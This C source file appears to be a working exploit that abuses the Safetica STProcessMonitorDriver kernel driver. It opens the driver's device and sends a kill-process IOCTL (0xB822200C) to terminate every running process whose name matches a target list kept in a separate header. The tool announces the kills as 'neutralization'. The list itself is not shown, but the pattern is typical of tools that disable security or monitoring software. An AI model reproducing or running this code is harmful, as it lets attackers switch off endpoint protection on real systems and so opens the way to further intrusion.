#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include "0xtargets.h"

#define IOCTL_KILL_PROCESS 0xB822200C

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;

    // Fixed: Backslashes must be escaped in C strings
    hDevice = CreateFileA(
        "\\\\.\\STProcessMonitorDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open a handle to the driver. Error: %lu\n", GetLastError());
        printf("[!] Is the driver loaded? Run: sc start STProcessMonitor\n");
        return -1;
    }

    printf("[+] Successfully connected to the Safetica driver.\n");

    int terminated_count = 0;

    // Fixed: Variable name must match the declaration in 0xtargets.h
    for (int i = 0; target_processes[i] != NULL; i++) {
        const char* target_name = target_processes[i];
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (hSnapshot == INVALID_HANDLE_VALUE) {
            continue;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, target_name) == 0) {
                    // Safetica's driver expects a 64-bit PID for this IOCTL
                    UINT64 targetPid = (UINT64)pe32.th32ProcessID;

                    printf("[*] Found %s (PID %llu). Sending IOCTL 0x%lX...\n", target_name, targetPid, IOCTL_KILL_PROCESS);

                    bResult = DeviceIoControl(
                        hDevice,
                        IOCTL_KILL_PROCESS,
                        &targetPid,        // Input buffer: The PID
                        sizeof(targetPid), // Input size: 8 bytes
                                              NULL,              // Output buffer: Not needed
                                              0,
                                              &bytesReturned,
                                              NULL
                    );

                    if (!bResult) {
                        printf("[-] Exploit failed for PID %llu. Error: %lu\n", targetPid, GetLastError());
                    } else {
                        printf("[+] Success! Driver terminated %s.\n", target_name);
                        terminated_count++;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    if (terminated_count == 0) {
        printf("[*] No target processes found to neutralize.\n");
    } else {
        printf("\n[+] Neutralization complete. %d processes stopped.\n", terminated_count);
    }

    CloseHandle(hDevice);
    return 0;
}
